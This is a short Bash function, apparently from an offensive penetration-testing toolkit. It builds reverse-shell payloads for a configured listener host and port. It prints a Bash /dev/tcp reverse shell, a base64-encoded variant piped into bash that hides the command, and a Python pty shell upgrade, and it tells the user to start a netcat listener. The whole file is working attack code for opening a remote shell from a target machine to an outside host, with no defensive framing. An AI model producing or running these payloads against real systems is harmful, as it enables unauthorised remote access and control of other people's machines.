#!/bin/bash

generate_payloads() {
    local lhost="${STATE[lhost]}"
    local lport="${STATE[lport]}"

    echo -e "${TXT_DRK_RED}============================================================${NC}"
    echo -e "${TXT_PULSE_RED}[///] COMPILING PAYLOAD SHELLS FOR: ${TXT_CORE}${lhost}:${lport}${NC}"
    echo -e "${TXT_DRK_RED}============================================================${NC}\n"

    local bash_rev="bash -i >& /dev/tcp/${lhost}/${lport} 0>&1"
    echo -e "${TXT_GLOW}[ BASH ]${NC} ${bash_rev}"

    local b64_rev=$(echo -n "$bash_rev" | base64 -w 0)
    echo -e "${TXT_GLOW}[ B64  ]${NC} echo ${b64_rev} | base64 -d | bash"

    local py_shell="python3 -c 'import pty; pty.spawn(\"/bin/bash\")'"
    echo -e "${TXT_GLOW}[ TTY  ]${NC} ${py_shell}"

    echo -e "\n${TXT_DRK_RED}------------------------------------------------------------${NC}"
    echo -e "${TXT_SCARLET}[!] Launch listener in separate tab: ${TXT_CORE}nc -lvnp ${lport}${NC}"
    echo -e "${TXT_DRK_RED}------------------------------------------------------------${NC}\n"
}